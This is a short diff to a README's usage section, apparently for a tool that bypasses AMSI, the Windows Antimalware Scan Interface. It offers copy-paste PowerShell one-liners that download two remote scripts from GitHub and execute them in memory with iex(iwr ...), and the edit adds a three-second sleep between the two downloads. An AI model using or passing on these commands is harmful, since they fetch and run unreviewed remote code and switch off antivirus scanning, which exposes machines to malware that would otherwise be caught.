@@ -5,7 +5,7 @@ Usage :
 Fast one liner, copy paste mode. 
 1. Simple, nice, clean and readable :) - Load two file from remote 
 ```
-iex(iwr https://raw.githubusercontent.com/zief/AMSI/main/aman.txt -Usebasicparsing);iex(iwr https://raw.githubusercontent.com/zief/AMSI/main/lain.txt -Usebasicparsing)
+iex(iwr https://raw.githubusercontent.com/zief/AMSI/main/aman.txt -Usebasicparsing);Start-sleep -s 3;iex(iwr https://raw.githubusercontent.com/zief/AMSI/main/lain.txt -Usebasicparsing)
 ```
 
 2. Load one remotely, and one in the oneliner.
